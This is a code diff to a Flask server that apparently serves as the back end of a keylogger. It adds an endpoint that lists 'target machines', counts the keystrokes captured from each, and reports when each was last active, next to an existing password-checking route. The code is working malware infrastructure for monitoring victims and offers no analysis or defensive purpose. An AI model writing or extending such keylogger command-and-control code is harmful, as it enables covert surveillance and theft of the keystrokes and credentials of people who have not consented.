@@ -165,6 +165,65 @@ def check_passwords():
         return jsonify({"status": "success"}), 200
     return jsonify({"error": "Password not found"}), 404
 
+@app.route('/api/get_machines_details', methods=['GET'])
+def get_machines_details():
+    """
+    Get detailed information about target machines including last activity and keystroke counts.
+
+    Returns:
+        Response: JSON response containing detailed information about each machine.
+    """
+    if not os.path.exists(DATA_FOLDER):
+        return jsonify({"machines": []}), 200
+        
+    machines = os.listdir(DATA_FOLDER)
+    machine_details = []
+
+    for machine in machines:
+        machine_folder = os.path.join(DATA_FOLDER, machine)
+        if not os.path.isdir(machine_folder):
+            continue
+
+        files = sorted(os.listdir(machine_folder), reverse=True)  # Newest first
+        total_keystrokes = 0
+        last_activity = None
+
+        for file in files:
+            file_path = os.path.join(machine_folder, file)
+            try:
+                with open(file_path, "r", encoding="utf-8") as f:
+                    file_data = json.load(f)  # Load the entire JSON list
+                    if isinstance(file_data, list):  # Ensure it's a valid list
+                        for entry in file_data:
+                            if "data" in entry:
+                                total_keystrokes += len(entry["data"])
+                        
+                        # Get last activity from the newest file's last entry
+                        if not last_activity and file_data and "timestamp" in file_data[-1]:
+                            last_activity = file_data[-1]["timestamp"]
+            except json.JSONDecodeError:
+                print(f"Warning: Skipping corrupted file {file_path}")
+            except Exception as e:
+                print(f"Error processing file {file_path}: {e}")
+
+        # Determine if the machine is active (activity in the last hour)
+        is_active = False
+        if last_activity:
+            try:
+                last_activity_time = datetime.strptime(last_activity, "%Y-%m-%d %H:%M:%S")
+                time_diff = datetime.now() - last_activity_time
+                is_active = time_diff.total_seconds() < 3600  # Active if activity in last hour
+            except Exception as e:
+                print(f"Error parsing timestamp: {e}")
+
+        machine_details.append({
+            "name": machine,
+            "last_activity": last_activity,
+            "total_keystrokes": total_keystrokes,
+            "is_active": is_active
+        })
+
+    return jsonify({"machines": machine_details}), 200
 
 if __name__ == '__main__':
     app.run(debug=True)
